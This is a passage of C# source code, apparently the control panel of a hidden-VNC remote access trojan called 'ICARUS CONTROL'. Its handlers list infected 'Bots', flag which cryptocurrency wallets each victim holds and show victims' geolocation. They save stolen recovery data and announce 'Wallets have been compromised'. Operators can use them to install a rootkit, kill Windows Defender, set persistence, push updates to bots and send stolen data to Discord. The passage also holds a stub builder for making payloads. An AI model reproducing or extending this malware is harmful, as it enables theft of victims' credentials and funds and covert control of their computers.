                        hVNC2.txtStarcoin.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8016", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    hVNC2.txtSlope.Text = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtSlope.ForeColor = Color.LimeGreen;
                        hVNC2.txtSlope.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtSlope.ForeColor = Color.DarkRed;
                        hVNC2.txtSlope.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8017", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtSollet.ForeColor = Color.LimeGreen;
                        hVNC2.txtSollet.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtSollet.ForeColor = Color.DarkRed;
                        hVNC2.txtSollet.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8018", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtMetamask.ForeColor = Color.LimeGreen;
                        hVNC2.txtMetamask.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtMetamask.ForeColor = Color.DarkRed;
                        hVNC2.txtMetamask.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8019", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtTon.ForeColor = Color.LimeGreen;
                        hVNC2.txtTon.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtTon.ForeColor = Color.DarkRed;
                        hVNC2.txtTon.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8020", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtXinPay.ForeColor = Color.LimeGreen;
                        hVNC2.txtXinPay.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtXinPay.ForeColor = Color.DarkRed;
                        hVNC2.txtXinPay.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8021", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtTron.ForeColor = Color.LimeGreen;
                        hVNC2.txtTron.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtTron.ForeColor = Color.DarkRed;
                        hVNC2.txtTron.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8022", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtPhantom.ForeColor = Color.LimeGreen;
                        hVNC2.txtPhantom.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtPhantom.ForeColor = Color.DarkRed;
                        hVNC2.txtPhantom.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8023", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtMobox.ForeColor = Color.LimeGreen;
                        hVNC2.txtMobox.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtMobox.ForeColor = Color.DarkRed;
                        hVNC2.txtMobox.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8024", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtMath.ForeColor = Color.LimeGreen;
                        hVNC2.txtMath.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtMath.ForeColor = Color.DarkRed;
                        hVNC2.txtMath.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8025", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtIconex.ForeColor = Color.LimeGreen;
                        hVNC2.txtIconex.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtIconex.ForeColor = Color.DarkRed;
                        hVNC2.txtIconex.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8026", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtGuild.ForeColor = Color.LimeGreen;
                        hVNC2.txtGuild.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtGuild.ForeColor = Color.DarkRed;
                        hVNC2.txtGuild.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8027", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtEqual.ForeColor = Color.LimeGreen;
                        hVNC2.txtEqual.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtEqual.ForeColor = Color.DarkRed;
                        hVNC2.txtEqual.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8038", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtCoin98.ForeColor = Color.LimeGreen;
                        hVNC2.txtCoin98.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtCoin98.ForeColor = Color.DarkRed;
                        hVNC2.txtCoin98.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8039", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtBitapp.ForeColor = Color.LimeGreen;
                        hVNC2.txtBitapp.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtBitapp.ForeColor = Color.DarkRed;
                        hVNC2.txtBitapp.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8030", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtBinance.ForeColor = Color.LimeGreen;
                        hVNC2.txtBinance.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtBinance.ForeColor = Color.DarkRed;
                        hVNC2.txtBinance.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8028", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    hVNC2.txtlatitude.Text = array[1].ToString();
                }
                if (Operators.CompareString(left, "8029", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    hVNC2.txtlongitude.Text = array[1].ToString();
                }
                if (Operators.CompareString(left, "8031", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtAuvitas.ForeColor = Color.LimeGreen;
                        hVNC2.txtAuvitas.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtAuvitas.ForeColor = Color.DarkRed;
                        hVNC2.txtAuvitas.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8032", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtMathE.ForeColor = Color.LimeGreen;
                        hVNC2.txtMathE.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtMathE.ForeColor = Color.DarkRed;
                        hVNC2.txtMathE.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8033", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtMetamaskE.ForeColor = Color.LimeGreen;
                        hVNC2.txtMetamaskE.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtMetamaskE.ForeColor = Color.DarkRed;
                        hVNC2.txtMetamaskE.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8034", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtMTVS.ForeColor = Color.LimeGreen;
                        hVNC2.txtMTVS.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtMTVS.ForeColor = Color.DarkRed;
                        hVNC2.txtMTVS.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8035", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtRabet.ForeColor = Color.LimeGreen;
                        hVNC2.txtRabet.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtRabet.ForeColor = Color.DarkRed;
                        hVNC2.txtRabet.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8036", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtRonin.ForeColor = Color.LimeGreen;
                        hVNC2.txtRonin.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtRonin.ForeColor = Color.DarkRed;
                        hVNC2.txtRonin.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8037", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtYoroi.ForeColor = Color.LimeGreen;
                        hVNC2.txtYoroi.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtYoroi.ForeColor = Color.DarkRed;
                        hVNC2.txtYoroi.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8038", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtZilpay.ForeColor = Color.LimeGreen;
                        hVNC2.txtZilpay.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtZilpay.ForeColor = Color.DarkRed;
                        hVNC2.txtZilpay.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8039", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtExodusE.ForeColor = Color.LimeGreen;
                        hVNC2.txtExodusE.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtExodusE.ForeColor = Color.DarkRed;
                        hVNC2.txtExodusE.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8040", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtLitecoin.ForeColor = Color.LimeGreen;
                        hVNC2.txtLitecoin.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtLitecoin.ForeColor = Color.DarkRed;
                        hVNC2.txtLitecoin.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8041", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtDash.ForeColor = Color.LimeGreen;
                        hVNC2.txtDash.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtDash.ForeColor = Color.DarkRed;
                        hVNC2.txtDash.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8042", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtBitcoin.ForeColor = Color.LimeGreen;
                        hVNC2.txtBitcoin.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtBitcoin.ForeColor = Color.DarkRed;
                        hVNC2.txtBitcoin.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8043", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtETH.ForeColor = Color.LimeGreen;
                        hVNC2.txtETH.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtETH.ForeColor = Color.DarkRed;
                        hVNC2.txtETH.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8044", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtElec.ForeColor = Color.LimeGreen;
                        hVNC2.txtElec.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtElec.ForeColor = Color.DarkRed;
                        hVNC2.txtElec.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "8045", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    if (Results.Contains("1"))
                    {
                        hVNC2.txtAtom.ForeColor = Color.LimeGreen;
                        hVNC2.txtAtom.Text = array[1].ToString();
                    }
                    else
                    {
                        hVNC2.txtAtom.ForeColor = Color.DarkRed;
                        hVNC2.txtAtom.Text = array[1].ToString();
                    }
                }
                if (Operators.CompareString(left, "3810", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    hVNC2.txtRes.Text = Results;
                }
                if (Operators.CompareString(left, "3808", TextCompare: false) == 0)
                {
                    if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\Recovery"))
                    {
                        Directory.CreateDirectory("Recovery");
                    }
                    Results = array[1].ToString();
                    if (!Results.Contains("System"))
                    {
                        File.WriteAllText(Directory.GetCurrentDirectory() + "\\Recovery\\" + RandomMutex(10) + "_Recovery.txt", Results);
                    }
                    byte[] bytes = File.ReadAllBytes(Directory.GetCurrentDirectory() + "\\Recovery\\" + RandomMutex(10) + "_Recovery.txt");
                    File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\Recovery\\" + RandomMutex(10) + "_Recovery.zip", bytes);
                    File.Delete(Directory.GetCurrentDirectory() + "\\Recovery\\" + RandomMutex(10) + "_Recovery.txt");
                }
                if (Operators.CompareString(left, "3809", TextCompare: false) == 0)
                {
                    Results = array[1].ToString();
                    hVNC2.FrmTransfer0.FileTransferLabele.Text = "Wallets have been compromised,check your PHP uploader!";
                }
                GC.Collect();
            }
            else
            {
                hVNC2.VNCBoxe.Image = (Image)object_2;
            }
        }

        public static void clean(string path)
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(path);
            FileInfo[] files = directoryInfo.GetFiles();
            foreach (FileInfo fileInfo in files)
            {
                fileInfo.Delete();
            }
        }

        public static string RandomMutex(int length)
        {
            return new string(Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length).Select(__c.__9__33_0 ?? (__c.__9__33_0 = __c.__9._RandomMutex_b__33_0)).ToArray());
        }

        private void HVNCList_DoubleClick(object sender, EventArgs e)
        {
            if (ClientsList.FocusedItem.Index == -1)
            {
                return;
            }
            checked
            {
                for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
                {
                    if (Application.OpenForms[i].Tag == _clientList[ClientsList.FocusedItem.Index])
                    {
                        Application.OpenForms[i].Show();
                        return;
                    }
                }
                hVNC hVNC2 = new hVNC();
                hVNC2.Name = "VNCForm:" + Conversions.ToString(_clientList[ClientsList.FocusedItem.Index].GetHashCode());
                hVNC2.Tag = _clientList[ClientsList.FocusedItem.Index];
                string text = ClientsList.FocusedItem.SubItems[2].ToString();
                text = text.Replace("ListViewSubItem", " ICARUS CONTROL" + versioning() + "  - Connected to:");
                hVNC2.Text = text;
                hVNC2.Show();
            }
        }

        private void HVNCListenBtn_Click_1(object sender, EventArgs e)
        {
        }

        private void buildHVNCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StubBuilder stubBuilder = new StubBuilder(Settings.Default.PORT);
            stubBuilder.ShowDialog();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void SetLastColumnWidth()
        {
            ClientsList.Columns[ClientsList.Columns.Count - 1].Width = -2;
        }

        public DateTime UnixTimeToDateTime(long unixtime)
        {
            return new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local).AddSeconds(unixtime).ToLocalTime();
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            //using (Login login = new Login())
            //{
            //    login.ShowDialog();
            //}
            //txtSub.Text = Login.trance.expirydaysleft() ?? "";
            //Expiry.Text = UnixTimeToDateTime(long.Parse(Login.trance.user_data.subscriptions[0].expiry)).ToString() ?? "";
            contextMenuStrip1.Renderer = new BlueRenderer();
            timer1.Enabled = true;
            SetLastColumnWidth();
            ClientsList.Layout += _FrmMain_Load_b__41_0;
            ClientsList.View = View.Details;
            ClientsList.HideSelection = false;
            ClientsList.OwnerDraw = true;
            ClientsList.GridLines = false;
            ClientsList.BackColor = Color.FromArgb(226, 226, 226);
            ClientsList.DrawColumnHeader += __c.__9__41_1 ?? (__c.__9__41_1 = __c.__9._FrmMain_Load_b__41_1);
            ClientsList.DrawItem += __c.__9__41_2 ?? (__c.__9__41_2 = __c.__9._FrmMain_Load_b__41_2);
            ClientsList.DrawSubItem += __c.__9__41_3 ?? (__c.__9__41_3 = __c.__9._FrmMain_Load_b__41_3);
            if (Settings.Default.PORT.Length == 0)
            {
                using (Listener listener = new Listener())
                {
                    listener.ShowDialog();
                    return;
                }
            }
            chkListen.Checked = true;
        }

        private void listenning1_TextChanged(object sender, EventArgs e)
        {
        }

        private void HVNCListenPort_TextChanged(object sender, EventArgs e)
        {
        }

        private void studioButton5_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void hVNCPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            checked
            {
                if (ClientsList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("Please select a Bot first! ", "ICARUS");
                }
                else
                {
                    if (ClientsList.FocusedItem.Index == -1)
                    {
                        return;
                    }
                    for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
                    {
                        if (Application.OpenForms[i].Tag == _clientList[ClientsList.FocusedItem.Index])
                        {
                            Application.OpenForms[i].Show();
                            return;
                        }
                    }
                    hVNC hVNC2 = new hVNC();
                    hVNC2.Name = "VNCForm:" + Conversions.ToString(_clientList[ClientsList.FocusedItem.Index].GetHashCode());
                    hVNC2.Tag = _clientList[ClientsList.FocusedItem.Index];
                    string text = ClientsList.FocusedItem.SubItems[2].ToString();
                    string text2 = text;
                    int num = text2.IndexOf('@');
                    string myProperty = text2.Substring(1, num - 1);
                    hVNC2.MyProperty = myProperty;
                    text = text.Replace("ListViewSubItem", " ICARUS CONTROL " + versioning() + " - Connected to: ");
                    hVNC2.Text = text;
                    hVNC2.Show();
                }
            }
        }

        private void studioButton4_Click(object sender, EventArgs e)
        {
            base.WindowState = FormWindowState.Maximized;
        }

        private void studioButton3_Click(object sender, EventArgs e)
        {
            base.WindowState = FormWindowState.Normal;
        }

        private void studioButton1_Click(object sender, EventArgs e)
        {
            base.WindowState = FormWindowState.Minimized;
        }

        private void watcherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a Bot first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("1008* ", (TcpClient)tag);
            }
        }

        private void startupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a Bot first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("8890* ", (TcpClient)tag);
            }
        }

        private void SendTCP(object object_0, TcpClient tcpClient_1)
        {
            checked
            {
                try
                {
                    lock (tcpClient_1)
                    {
                        BinaryFormatter binaryFormatter = new BinaryFormatter();
                        binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                        binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                        binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                        object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                        MemoryStream memoryStream = new MemoryStream();
                        binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                        ulong num = (ulong)memoryStream.Position;
                        tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                        byte[] buffer = memoryStream.GetBuffer();
                        tcpClient_1.GetStream().Write(buffer, 0, (int)num);
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                }
                catch (Exception projectError)
                {
                    ProjectData.SetProjectError(projectError);
                    ProjectData.ClearProjectError();
                }
            }
        }

        private void taskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a Bot first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("8891* ", (TcpClient)tag);
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a Bot first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("8889* ", (TcpClient)tag);
                if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
                {
                    break;
                }
                SendTCP("24*", (TcpClient)tag);
                SendTCP("8889* ", (TcpClient)tag);
            }
        }

        private void rootkitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a Bot first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("2010* ", (TcpClient)tag);
            }
        }

        private void resetSizeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            hVNC hVNC2 = new hVNC();
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                hVNC2.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[i].GetHashCode());
                object tag = ClientsList.SelectedItems[i].Tag;
                hVNC2.Tag = tag;
                hVNC2.ResetScale();
                hVNC2.Dispose();
            }
        }

        private void passwordsRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void killWindowsDefenderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a Bot first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                object tag = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("2011* ", (TcpClient)tag);
            }
        }

        private void chkListen_CheckedChanged(object sender, EventArgs e)
        {
            checked
            {
                if (HVNCListen.Text.Contains("Disabled"))
                {
                    buildHVNCToolStripMenuItem.Enabled = true;
                    VNC_Thread = new Thread(Listenning)
                    {
                        IsBackground = true
                    };
                    bool_1 = true;
                    VNC_Thread.Start();
                    HVNCListen.Text = "Activated on:" + Settings.Default.PORT;
                }
                else
                {
                    if (!HVNCListen.Text.Contains("Activated"))
                    {
                        return;
                    }
                    IEnumerator enumerator = null;
                    while (true)
                    {
                        try
                        {
                            try
                            {
                                enumerator = Application.OpenForms.GetEnumerator();
                                while (enumerator.MoveNext())
                                {
                                    Form form = (Form)enumerator.Current;
                                    if (form.Name.Contains("FrmVNC"))
                                    {
                                        form.Dispose();
                                    }
                                }
                            }
                            finally
                            {
                                if (enumerator is IDisposable)
                                {
                                    (enumerator as IDisposable).Dispose();
                                }
                            }
                        }
                        catch (Exception)
                        {
                            continue;
                        }
                        break;
                    }
                    VNC_Thread.Abort();
                    bool_1 = false;
                    HVNCListen.Text = "Disabled";
                    buildHVNCToolStripMenuItem.Enabled = false;
                    ClientsList.Items.Clear();
                    _TcpListener.Stop();
                    int num = _clientList.Count - 1;
                    for (int i = 0; i <= num; i++)
                    {
                        _clientList[i].Close();
                    }
                    _clientList = new List<TcpClient>();
                    int_2 = 0;
                    Text = " ICARUS CONTROL" + versioning() + "  - Connections: 0";
                }
            }
        }

        private void passwordsRecoveryToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (ST_0.IsDisposed)
            {
                ST_0 = new TGtoDSC();
            }
            ST_0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            ST_0.Text = Text.Replace(" ICARUS CONTROL" + versioning() + " [ Connected: " + userName + "  ] ", null);
            ST_0.Show();
        }

        private void stealAndSendToDiscordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ST_0.IsDisposed)
            {
                ST_0 = new TGtoDSC();
            }
            ST_0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            ST_0.Text = Text.Replace(" ICARUS CONTROL" + versioning() + " [ Connected: " + userName + "  ] ", null);
            ST_0.Show();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            ClientsList.Refresh();
        }

        private void updateBotsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (ClientsList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a Bot first! ");
                    return;
                }
                new BotsUpdate().ShowDialog();
                if (!ispressed)
                {
                    return;
                }
                hVNC hVNC2 = new hVNC();
                foreach (object selectedItem in ClientsList.SelectedItems)
                {
                    _ = selectedItem;
                    count = ClientsList.SelectedItems.Count;
                }
                for (int i = 0; i < count; i++)
                {
                    hVNC2.Name = "VNCForm:" + Conversions.ToString(ClientsList.SelectedItems[i].GetHashCode());
                    object tag = ClientsList.SelectedItems[i].Tag;
                    hVNC2.Tag = tag;
                    hVNC2.UpdateClient(MassURL);
                    hVNC2.Dispose();
                }
                MessageBox.Show("Execution successfully To Selected Bots: " + count);
                ispressed = false;
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Execute Update Bots");
                Close();
            }
        }

        private void downloadExecutewithArgsToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a Bot first! ", "ICARUS");
                return;
            }
            foreach (object selectedItem in ClientsList.SelectedItems)
            {
                _ = selectedItem;
                count = ClientsList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                _ = ClientsList.SelectedItems[i].Tag;
                ClientsList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                string text = ClientsList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("2069*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                selectedClient = text;
                RDF = new RD(getSelectedClient(selectedClient));
                RDF.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                RDF.Text = Text.Replace(" ICARUS CONTROL" + versioning() + " [ Connected: " + userName + "  ] ", null);
                RDF.Show();
            }
        }

        public string getIp(string remoteendpoint)
        {
            try
            {
                string[] array = remoteendpoint.Split(':');
                return array[0];
            }
            catch
            {
                return "127.0.0.1";
            }
        }

        public TcpClient getSelectedClient(string client)
        {
            TcpClient result = null;
            for (int i = 0; i < clients.Count; i++)
            {
